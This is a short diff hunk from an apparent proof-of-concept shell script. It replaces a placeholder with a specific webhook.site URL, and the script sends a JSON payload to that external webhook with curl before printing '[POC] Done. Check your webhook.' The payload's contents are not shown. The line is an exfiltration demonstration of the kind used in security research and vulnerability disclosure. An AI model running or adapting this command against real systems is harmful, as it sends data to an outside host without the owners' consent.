@@ -58,7 +58,7 @@ EOF
 )
 
 # Send the payload to the external webhook
-curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/YOUR_UNIQUE_URL_HERE
+curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/83eec9ca-ff62-4398-ab88-84e4376b6032
 
 echo "[POC] Done. Check your webhook."
 echo "================================================================="
